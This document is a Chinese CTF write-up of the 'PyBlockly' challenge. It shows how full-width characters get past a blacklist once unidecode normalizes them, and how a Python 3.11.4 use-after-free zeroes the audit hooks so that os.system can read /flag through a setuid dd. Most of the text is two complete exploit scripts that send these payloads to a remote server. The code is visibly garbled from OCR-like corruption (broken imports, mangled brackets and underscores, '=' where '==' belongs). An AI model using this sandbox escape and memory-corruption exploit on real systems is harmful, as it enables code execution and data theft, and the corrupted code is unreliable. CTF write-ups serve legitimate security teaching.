---
tags: [Python RCE, 全角字符绕过, Audit Hook绕过, UAF漏洞, 源码审计]
---

# PyBlockly

题目是一个图形编程服务， 观察到不同的block会被转换成python代码直接执行。TEXT block允许我们插入任意字符串， 但是有 *r*"[ !\\"#$%& ' ()*+ ,- ./ :;艹?@[\\\\\\]^_ {|}~]" 限制。满足要求的字符串会被 unidecode.unidecode ` 解码， 在解码过程中会将全角字符转换成半角字符， 因此利用这个特性， 可以绕过特殊符号的限制。

绕过了特殊字符的限制之后， 还有一层audit的限制， 主要为：事件名称长度不能超过4， 不能包含 [ "popen " ,  "input " ,  "eval " , "exec " , "compile " , "memoryview"] 中的字符， 该限制较为严格。 因此首先尝试获取python版本。

利用下面的代码获得远程python的版本

```
import
import
import


requests re
unidecode


blacklist_pattern  =  r "[ !\\"#$%& ' ()*+ , - ./ : ;艹?@[\\\\\\]^_ `{ B~ ] "

url  =  '<http:Ⅱ127.0.0.1:5000/blockly_json>'
remote  =   '<http:Ⅱeci-
2ze51w201x5h9r3nrywv .cloudeci1 .ichunqiu .com:5000/blockly_json> '

url  =  remote

payload  =  """'\\nprint(一import一 ('sys ') .version)\\n ' " " "

payload_encode  =  payload .replace( " ' " , "＇ ") .replace( "
(","‘") .replace (") " , "﹚ ") .replace ("/ " , "／ ") .replace ( " . " , "﹒ ") .replace ( "_ " , "＿ ") .
replace( "+ " , "＋ ") .replace( " - " , "－ ") .replace( "= " , "＝ ") .replace( "
[ " , "［") .replace ("] " , "］ ") .replace ( " , " , " ， ") .replace ( " : " , "： ") .replace ( ' " ' , '＂ ')
.replace( "> " , "＞ ") .replace( "* " , "＊ ")
black_word  =  re .search(blacklist_pattern ,  payload_encode)
print(black_word)
payload_decode  =  unidecode .unidecode(payload_encode)
assert  payload_decode  =  payload

data  =  {"blocks " :{"blocks " : [{"type " : "text " , "fields " :
{"TEXT " :payload_encodeB] B

res  =  requests .post(url ,  json=data)
print(res .text)
```

可以获取到远程版本为3.11.4， 该版本Python存在一个UAF漏洞， 可以绕过audit函数的审计。利用 https://github.com/Nambers/python-audit_hook_head_finder ， 计 算 出 该 版 本 python 的audit函数偏移， 绕过audit限制

```
import
import
import


requests re
unidecode


blacklist_pattern  =  r "[ !\\"#$%& ' ()*+ , - ./ : ;艹?@[\\\\\\]^_ `{ B~ ] "

url  =  '<http:Ⅱ127.0.0.1:5000/blockly_json>'
remote  =   '<http:Ⅱeci-
2ze51w201x5h9r3nrywv .cloudeci1 .ichunqiu .com:5000/blockly_json> '

url  =  remote

payload  =  " " " '
PTR_OFFSET  =  [32 ,  168 ,  0xd0b0 ,  -0x20d8]
getptr  =  lambda  func :  int(str(func) .split("0x") [-1] .split("> ") [0 ] ,  16) class  UAF :
def  一index一 (self) :
global  memory
uaf .clear()
memory  =  bytearray()
uaf .extend([0 ]  *  56)
return  1

uaf  =  bytearray(56)
uaf [23]  =  UAF()

ptr  =  getptr(一import一 ('os ') .system .一init一 )  +  PTR_OFFSET[0 ]
ptr  =  int .from_bytes(memory [ptr:ptr  +  8 ] ,  'little ')  +  PTR_OFFSET [1 ]

audit_hook_by_py  =  int .from_bytes(memory [ptr:ptr  +  8 ] ,  'little ')  + PTR_OFFSET [2 ]
audit_hook_by_c  =  int .from_bytes(memory [ptr:ptr  +  8 ] ,  'little ')  + PTR_OFFSET [3 ]
memory[audit_hook_by_py:audit_hook_by_py  +  8 ]  =  [0 ]  *  8
memory[audit_hook_by_c:audit_hook_by_c  +  8 ]  =  [0 ]  *  8

一import一 ('os ') .system("dd  if=/flag")
' " " "

payload_encode  =  payload .replace( " ' " , "＇ ") .replace( "
(","‘") .replace (") " , "﹚ ") .replace ("/ " , "／ ") .replace ( " . " , "﹒ ") .replace ( "_ " , "＿ ") . replace( "+ " , "＋ ") .replace( " - " , "－ ") .replace( "= " , "＝ ") .replace( "
[ " , "［") .replace ("] " , "］ ") .replace ( " , " , " ， ") .replace ( " : " , "： ") .replace ( ' " ' , '＂ ') .replace( "> " , "＞ ") .replace( "* " , "＊ ")
black_word  =  re .search(blacklist_pattern ,  payload_encode)
print(black_word)
payload_decode  =  unidecode .unidecode(payload_encode) assert  payload_decode  =  payload
data  =  {"blocks " :{"blocks " : [{"type " : "text " , "fields " : {"TEXT " :payload_encodeB] B

res  =  requests .post(url ,  json=data)
print(res .text)
```

发现远程系统中， dd程序带s标志位， 因此使用dd读取flag。